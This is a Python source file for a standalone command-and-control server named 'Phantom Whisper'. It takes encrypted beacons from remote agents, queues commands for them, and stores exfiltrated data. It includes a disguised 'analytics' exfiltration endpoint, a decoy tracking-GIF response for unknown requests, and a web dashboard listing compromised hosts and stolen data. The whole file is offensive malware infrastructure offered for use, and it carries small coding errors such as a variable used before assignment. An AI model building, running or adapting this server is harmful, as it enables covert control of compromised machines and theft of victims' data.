#!/usr/bin/env python3
"""
Phantom Whisper C2 Server — Standalone
Run standalone: python3 c2_server.py
Connects agents and manages commands via HTTP API.
"""
import asyncio
import json
import sys
import os
import time
import base64
import threading
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

CONFIG_DIR = Path.home() / ".phantom"
CONFIG_DIR.mkdir(exist_ok=True)
DATA_DIR = CONFIG_DIR / "data"
DATA_DIR.mkdir(exist_ok=True)
LOG_DIR = CONFIG_DIR / "logs"
LOG_DIR.mkdir(exist_ok=True)

PASSWORD = os.environ.get("PW_C2_PASSWORD", "phantom_c2_secret_2026")
SALT = base64.b64decode(os.environ.get("PW_C2_SALT", base64.b64encode(b"phantom_salt_2026").decode()))

class Encryption:
    def __init__(self):
        if not HAS_CRYPTO:
            print("[!] Install: pip install cryptography")
            sys.exit(1)
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=SALT, iterations=600000)
        key = base64.urlsafe_b64encode(kdf.derive(PASSWORD.encode()))
        self.cipher = Fernet(key)

    def encrypt_json(self, data: dict) -> str:
        return base64.b64encode(self.cipher.encrypt(json.dumps(data, default=str).encode())).decode()

    def decrypt_json(self, data: str) -> dict:
        return json.loads(self.cipher.decrypt(base64.b64decode(data)).decode())

class C2Agent:
    def __init__(self, agent_id: str, hostname: str = "", ip: str = ""):
        self.id = agent_id
        self.hostname = hostname
        self.ip = ip
        self.first_seen = datetime.now().isoformat()
        self.last_seen = datetime.now().isoformat()
        self.beacons = 0
        self.os = "unknown"
        self.version = ""

    def to_dict(self) -> dict:
        return {
            "id": self.id, "hostname": self.hostname, "ip": self.ip,
            "first_seen": self.first_seen, "last_seen": self.last_seen,
            "beacons": self.beacons, "os": self.os, "version": self.version
        }

class C2Server:
    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        self.host = host
        self.port = port
        self.agents: Dict[str, C2Agent] = {}
        self.commands: Dict[str, List[dict]] = {}
        self.exfil: List[dict] = []
        self.enc = Encryption()
        self._log(f"C2 Server initialized on {host}:{port}")

    def _log(self, msg: str):
        ts = datetime.now().isoformat()
        log_file = LOG_DIR / f"c2_server_{datetime.now().strftime('%Y%m%d')}.log"
        with open(log_file, "a") as f:
            f.write(f"[{ts}] {msg}\n")
        print(f"[{ts}] {msg}")

    async def handle_request(self, reader, writer):
        try:
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=10)
                if not chunk:
                    break
                data += chunk

            request = data.decode("utf-8", errors="replace")
            lines = request.split("\r\n")
            if not lines:
                writer.close()
                return

            method, path, _ = lines[0].split(" ", 2)
            body_start = request.find("\r\n\r\n") + 4
            body = request[body_start:] if body_start < len(request) else ""

            # Routing
            if path.startswith("/api/v1/beacon") and method == "POST":
                try:
                    payload = self.enc.decrypt_json(body)
                    agent_id = payload.get("agent_id", "unknown")
                    if agent_id not in self.agents:
                        self.agents[agent_id] = C2Agent(
                            agent_id,
                            payload.get("hostname", ""),
                            payload.get("ip", "")
                        )
                        self._log(f"NEW AGENT: {agent_id} ({payload.get('hostname','?')})")
                    else:
                        agent = self.agents[agent_id]
                        agent.last_seen = datetime.now().isoformat()
                        agent.ip = payload.get("ip", agent.ip)
                        agent.hostname = payload.get("hostname", agent.hostname)

                    agent.beacons += 1
                    cmds = self.commands.pop(agent_id, [])
                    resp = {"status": "ok", "commands": cmds} if cmds else {"status": "ok", "commands": []}
                    resp_body = self.enc.encrypt_json(resp)
                    writer.write(
                        f"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {len(resp_body)}\r\n\r\n{resp_body}".encode()
                    )
                except Exception as e:
                    self._log(f"Beacon error: {e}")
                    writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n")

            elif path == "/api/v1/agents" and method == "GET":
                resp_body = json.dumps({"agents": [a.to_dict() for a in self.agents.values()]}).encode()
                writer.write(
                    f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(resp_body)}\r\n\r\n".encode()
                )
                writer.write(resp_body)

            elif path.startswith("/api/v1/command/") and method == "POST":
                agent_id = path.split("/")[-1]
                try:
                    cmd = json.loads(body)
                    if agent_id not in self.commands:
                        self.commands[agent_id] = []
                    self.commands[agent_id].append(cmd)
                    self._log(f"Command queued for {agent_id}: {cmd.get('action', '?')}")
                    writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
                except:
                    writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n")

            elif path == "/api/v1/exfil" and method == "POST":
                try:
                    payload = self.enc.decrypt_json(body)
                    entry = {"timestamp": datetime.now().isoformat(), **payload}
                    self.exfil.append(entry)
                    fname = f"exfil_{payload.get('agent_id','?')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    (DATA_DIR / fname).write_text(json.dumps(entry, indent=2))
                    self._log(f"EXFIL from {payload.get('agent_id','?')}: {payload.get('type','?')}")
                    writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
                except:
                    writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n")

            elif path == "/analytics/collect" and method == "POST":
                # HTTP mimic endpoint
                try:
                    payload = self.enc.decrypt_json(body)
                    entry = {"timestamp": datetime.now().isoformat(), **payload}
                    self.exfil.append(entry)
                    self._log(f"Analytics exfil from {payload.get('agent_id','?')}")
                except:
                    pass
                writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")

            elif path.startswith("/assets/images/") and method == "GET":
                writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")

            elif path == "/api/v1/dashboard" and method == "GET":
                html = f"""<!DOCTYPE html>
<html><head><title>PW C2 Dashboard</title>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ background:#0a0a12; color:#e0e0e0; font-family:'Courier New',monospace; padding:20px; }}
h1 {{ color:#FF00FF; border-bottom:2px solid #FF00FF; padding-bottom:10px; }}
h2 {{ color:#00FFFF; margin:20px 0 10px; }}
table {{ width:100%; border-collapse:collapse; margin:10px 0; }}
th {{ background:#1a1a2e; color:#00FFFF; padding:10px; text-align:left; }}
td {{ padding:8px 10px; border-bottom:1px solid #333; }}
tr:hover {{ background:#1a1a2e; }}
.status {{ color:#00FF00; }}
.agent-id {{ color:#FF00FF; }}
.ip {{ color:#0080FF; }}
.count {{ color:#FFFF00; }}
pre {{ background:#111; padding:10px; border-radius:4px; overflow-x:auto; }}
a {{ color:#00FFFF; text-decoration:none; }}
a:hover {{ text-decoration:underline; }}
.box {{ background:#111; border:1px solid #333; border-radius:6px; padding:15px; margin:10px 0; }}
.row {{ display:flex; gap:20px; flex-wrap:wrap; }}
.stat {{ flex:1; min-width:150px; text-align:center; padding:20px; background:#111; border-radius:6px; border:1px solid #333; }}
.stat-num {{ font-size:2em; font-weight:bold; color:#FF00FF; }}
.stat-label {{ color:#888; font-size:0.9em; margin-top:5px; }}
</style></head><body>
<h1>🔮 Phantom Whisper C2 Dashboard</h1>
<div class="row">
<div class="stat"><div class="stat-num">{len(self.agents)}</div><div class="stat-label">Agents</div></div>
<div class="stat"><div class="stat-num">{sum(a.beacons for a in self.agents.values())}</div><div class="stat-label">Total Beacons</div></div>
<div class="stat"><div class="stat-num">{len(self.exfil)}</div><div class="stat-label">Exfil Events</div></div>
<div class="stat"><div class="stat-num">{sum(len(v) for v in self.commands.values())}</div><div class="stat-label">Pending Commands</div></div>
</div>
<h2>🤖 Connected Agents</h2>
<div class="box">
<table>
<tr><th>ID</th><th>Hostname</th><th>IP</th><th>Beacons</th><th>Last Seen</th><th>Actions</th></tr>
"""
                for a in self.agents.values():
                    html += f"<tr><td class='agent-id'>{a.id}</td><td>{a.hostname}</td><td class='ip'>{a.ip}</td><td class='count'>{a.beacons}</td><td>{a.last_seen}</td><td><a href='#' onclick='sendCmd(\"{a.id}\")'>Send Command</a></td></tr>"

                html += """</table></div>
<h2>📤 Recent Exfil</h2>
<div class="box"><pre>"""
                for e in self.exfil[-20:]:
                    html += json.dumps(e, indent=2, default=str)[:300] + "\n---\n"
                html += """</pre></div>
<script>
function sendCmd(id) {{
    var action = prompt("Command action:");
    if(action) fetch('/api/v1/command/'+id, {{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{action:action,params:{{}},timestamp:new Date().toISOString()}})}}).then(r=>{if(r.ok)alert('Command sent!');});
}}
setTimeout(function(){{location.reload();}}, 10000);
</script>
</body></html>"""
                resp_body = html.encode()
                writer.write(
                    f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(resp_body)}\r\n\r\n".encode()
                )
                writer.write(resp_body)

            else:
                # Default: 1x1 transparent GIF
                gif = b"GIF89a\x01\x00\x01\x00\x80\x01\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
                writer.write(
                    f"HTTP/1.1 200 OK\r\nContent-Type: image/gif\r\nContent-Length: {len(gif)}\r\n"
                    f"Cache-Control: no-store\r\n\r\n".encode()
                )
                writer.write(gif)

            await writer.drain()
        except Exception as e:
            self._log(f"Handler error: {e}")
        finally:
            try:
                writer.close()
            except:
                pass

    async def start(self):
        server = await asyncio.start_server(self.handle_request, self.host, self.port)
        self._log(f"C2 Server listening on {self.host}:{self.port}")
        print(f"\n{'='*60}")
        print(f"  Phantom Whisper C2 Server")
        print(f"  Dashboard:  http://{self.host}:{self.port}/api/v1/dashboard")
        print(f"  API:        http://{self.host}:{self.port}/api/v1/")
        print(f"{'='*60}\n")
        async with server:
            await server.serve_forever()

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    server = C2Server(host, port)
    try:
        asyncio.run(server.start())
    except KeyboardInterrupt:
        print("\nServer stopped.")

if __name__ == "__main__":
    main()
